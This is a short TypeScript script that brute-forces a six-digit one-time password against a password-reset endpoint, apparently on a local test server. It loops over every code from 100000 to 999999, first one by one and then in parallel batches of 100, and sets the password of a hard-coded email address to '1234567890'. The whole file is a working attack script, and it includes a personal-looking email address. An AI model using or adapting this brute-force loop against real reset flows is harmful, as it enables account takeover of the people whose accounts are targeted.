import axios from "axios";


async function  sendRequest(otp:string) {
    let data = JSON.stringify({
    "email": "ashisdutta795@gmail.com",
    "otp": otp,
    "newPassword": "1234567890"
    });

    let config = {
    method: 'post',
    maxBodyLength: Infinity,
    url: 'http://localhost:3000/reset-password',
    headers: { 
        'Content-Type': 'application/json'
    },
    data : data
    };

    try {
        await axios.request(config)
    } catch (error) {
        //console.log(error)
    }
};


for(let i=100000; i<=999999; i++){ 
    const otp=JSON.stringify(i);
    console.log(otp);
    await sendRequest(otp);
}

async function  main() {
    for(let i=100000; i<=999999; i+=100){
        const p=[];
        console.log(i)
        for(let j=0; j<100; j++){
            p.push(sendRequest((i+j).toString()))
        }
        await Promise.all(p);
    }
}

